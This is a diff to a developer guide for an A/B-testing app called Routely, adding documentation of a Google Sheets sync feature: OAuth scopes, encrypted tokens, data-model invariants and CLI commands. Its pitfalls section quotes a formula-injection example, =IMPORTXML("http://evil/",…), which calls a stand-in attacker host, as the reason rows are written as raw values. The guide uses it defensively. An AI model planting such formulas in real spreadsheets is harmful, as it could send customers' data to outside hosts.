@@ -95,7 +95,7 @@ routely/
 ├── infra/
 │   ├── docker-compose.dev.yml    Postgres only (the app runs on the host)
 │   └── nginx/conf.d/             app.conf, cdn.conf — production reference configs
-└── docs/                     ARCHITECTURE, DATABASE, AUTH, SDK-DEPLOYMENT
+└── docs/                     ARCHITECTURE, DATABASE, AUTH, SDK-DEPLOYMENT, INTEGRATIONS
 ```
 
 **Read the docs in `docs/` before large changes.** They carry the reasoning, not just the
@@ -115,7 +115,11 @@ must be labelled as such wherever it appears.
 | `/experiments` | `(app)` | All experiments: status tabs, search, lift column |
 | `/experiments/new`, `/experiments/[experimentId]` | `(app)` | Create; detail with results, status, edit, share |
 | `/share/[token]` | — | **Public**, read-only results. No session. `noindex` |
+| `/integrations` | `(app)` | Google Sheets connection, destination, sync history |
 | `/api/auth/[...nextauth]` | — | Auth.js handlers, Node runtime |
+| `/api/integrations/google/start` | — | **POST only.** Mints signed state, redirects to Google |
+| `/api/integrations/google/callback` | — | Verifies state, exchanges the code, stores the connection |
+| `/api/cron/sheets-sync` | — | Scheduled daily sync. Requires `Authorization: Bearer $CRON_SECRET` |
 | `/api/v1/config` | — | **Public.** Active experiments for a site id |
 | `/api/v1/events` | — | **Public.** Event ingestion |
 
@@ -208,6 +212,42 @@ everyone bucketed had the opportunity to convert, and the smaller denominator wo
 rate for whichever arm loses more visitors before rendering — exactly what a redirect test
 measures.
 
+### The Sheets integration: one grant, one spreadsheet per website
+
+The customer authorises Google **once per account** (`SheetsConnection` — the grant, nothing else).
+Each **website** then points at its own spreadsheet (`WebsiteSheetTarget`). Attaching one needs no
+consent screen because the grant already exists, and a grant per website would hit Google's ~100
+refresh-tokens-per-client cap. Attaching is **optional**; a website with no target is not synced.
+
+**Scopes are all non-sensitive — `openid`, `userinfo.email`, `drive.file` — so Google requires no
+verification review.** `drive.file` covers `spreadsheets.create` and `values.append` on files the app
+created or the customer picked, because the Sheets API accepts Drive scopes. Do **not** re-add
+`spreadsheets` (sensitive) or `drive.metadata.readonly` (restricted, plus a paid annual security
+assessment); the first was replaced by `drive.file`, the second by the Google Picker. Consequence:
+**Routely cannot list a customer's spreadsheets** — browsing is the Picker's job, and a
+`files.list` under `drive.file` would return only files this app made. `include_granted_scopes` is
+deliberately absent from the authorize URL, or the narrowing would never take effect for anyone who
+granted the old scopes.
+
+### The Sheets integration is a second OAuth flow, not the sign-in provider
+
+Adding `spreadsheets` and `drive.metadata.readonly` to the Auth.js Google provider would force
+every customer to grant Drive access **merely to sign in**, and `Account`'s
+`@@unique([provider, providerAccountId])` means a second consent for the same Google account would
+write over the sign-in row the adapter owns. So `/api/integrations/google/{start,callback}` is a
+hand-rolled authorization-code flow writing to `sheets_connections`. No `googleapis` dependency —
+four documented REST endpoints do not justify megabytes of transitive dependency, and the app's
+only other outbound call is a hand-written `fetch` too.
+
+The refresh token is the only value in this database that grants ongoing access to something
+*outside* Routely, so it is the only value encrypted at rest (AES-256-GCM, `lib/secret-box.ts`).
+`TOKEN_ENCRYPTION_KEY` is deliberately separate from `AUTH_SECRET`: rotating `AUTH_SECRET` signs
+everyone out, whereas rotating this forces every customer to reconnect. With no key the integration
+reports itself unavailable — it never stores a token in the clear.
+
+`docs/INTEGRATIONS.md` carries the rest, including why the feature is **not exactly-once** and must
+not be described as such.
+
 ---
 
 ## 6. Data model invariants
@@ -221,6 +261,9 @@ These constraints carry the product's guarantees. **Do not weaken them.**
 | `assignments (experimentId, visitorId)` unique | **A visitor can never hold both arms** |
 | `conversions.assignmentId` unique | **A refresh cannot inflate the conversion count** |
 | `experiments.shareToken` unique | Safe to look up a public results page by token alone |
+| `sheets_connections.userId` unique | One Google *authorisation* per account (not a destination) |
+| `website_sheet_targets.websiteId` unique | One spreadsheet per website |
+| `sheets_sync_runs (websiteId, day)` unique | **A day's rows are appended once per website**, claimed before the write |
 
 Enum values: `ExperimentStatus` (DRAFT/ACTIVE/PAUSED/ARCHIVED), `UrlMatchType` (EXACT/PREFIX),
 `Variant` (CONTROL/VARIANT), `EventType` (`page_view`, `assignment`, `time_on_page`,
@@ -347,6 +390,8 @@ npm run check                      # typecheck + lint + format:check + tests —
 npm run build                      # builds the SDK first, then the app
 npm run db:verify                  # 16-check data-model smoke test against live Postgres
 npm run sdk:build                  # size-budgeted SDK build
+npm run sheets:sync -- --dry-run --day 2026-09-28 --user <id>   # print rows, write nothing
+npm run sheets:sync                # the real daily sweep (needs TOKEN_ENCRYPTION_KEY)
 ```
 
 **Local and production are configured independently and need no switching.** `apps/web/.env`
@@ -361,7 +406,8 @@ duplicate `DATABASE_URL` line, so the local one *looked* right while the second 
 which aimed a command that drops every table at production data. `db:deploy` is deliberately
 **not** guarded: that is how Vercel applies migrations during `vercel-build`.
 
-Tests: **129** — 100 in the SDK, 29 in the app. Both run under Vitest in a Node environment.
+Tests: **264** — 129 in the SDK, 135 in the app. Both run under Vitest in a Node environment.
+(An earlier revision of this file said 129 total; that figure was already stale.)
 
 ---
 
@@ -407,6 +453,35 @@ renders correctly. Use a tolerant pattern when asserting against HTML.
 **`vm` contexts have no `URL`.** It is a Web API, not an ECMAScript built-in. Supply it when
 running the SDK bundle in a sandbox.
 
+**A `tsx` script cannot import anything under `src/server` without
+`--conditions=react-server`.** Those modules begin `import "server-only"`, whose whole job is to
+throw outside an RSC bundler; Node resolves that package's `react-server` export condition to a
+no-op. `npm run sheets:sync` does this, and also needs `import "dotenv/config"` *first* so `env.ts`
+has a `DATABASE_URL` to validate. `prisma/seed.ts` and `prisma/verify.ts` avoid the problem
+entirely by building their own Prisma client and importing nothing from `src/`.
+
+**`server-only` is also why `server/crypto.ts` and `lib/secret-box.ts` are split.** The cipher
+takes an explicit key and reads no configuration, so it is unit-testable; anything importing `env`
+fails under Vitest on a missing `DATABASE_URL` it never uses. Put pure logic in `lib/`, the
+configured wrapper in `server/`.
+
+**The Google Picker is why the scopes can stay non-sensitive.** It needs
+`NEXT_PUBLIC_GOOGLE_API_KEY` and `NEXT_PUBLIC_GOOGLE_PROJECT_NUMBER` (the Cloud project *number*,
+i.e. the digits before the dash in the client id) — without the latter, a picked file is never
+associated with the app and the write that follows 404s. In the Google console, *Authorized redirect
+URIs* and *Authorized JavaScript origins* are **different fields** and both are needed.
+
+**Sheets rows must be written with `valueInputOption=RAW`.** `USER_ENTERED` parses a leading `=`
+as a formula, and experiment names are customer-controlled text — so a name like
+`=IMPORTXML("http://evil/",…)` would become a live formula in the customer's spreadsheet. There is
+a test asserting a formula-shaped name passes through verbatim; if it fails, read the comment
+beside it before "fixing" it.
+
+**Prisma logs the sync's expected unique violations at error level.** A second worker losing the
+claim race prints `Unique constraint failed on ... sheets_sync_runs_websiteId_day_key`. That is
+the idempotency mechanism working, not a bug; it is not suppressed because silencing it would
+silence real constraint errors too.
+
 **Do not `pkill -f "next dev"`.** The pattern matches the wrapper shell running the command and
 kills your own process. Use `pkill -f "[n]ext-server"`.
 
@@ -438,6 +513,11 @@ Working: Google sign-in · website CRUD · install snippet · experiment create/
 · the SDK (assignment, loop-safe redirect, page views, visible time, conversions) · public
 config and ingestion endpoints with rate limiting and bot filtering · results dashboard · date
 ranges · relative change · public share links · experiments list.
+
+· **Google Sheets daily sync** — one Google grant per account, one spreadsheet per website,
+chosen through the Google Picker or created by Routely; non-sensitive `drive.file` scope only, so no
+Google verification review; encrypted refresh token, per-(website, day) claim row, Vercel cron plus a
+CLI script.
 
 **Not built:** the production Docker Compose stack and Dockerfile (only `docker-compose.dev.yml`
 and reference Nginx configs exist) · statistical significance · click / custom-JS / form goals ·
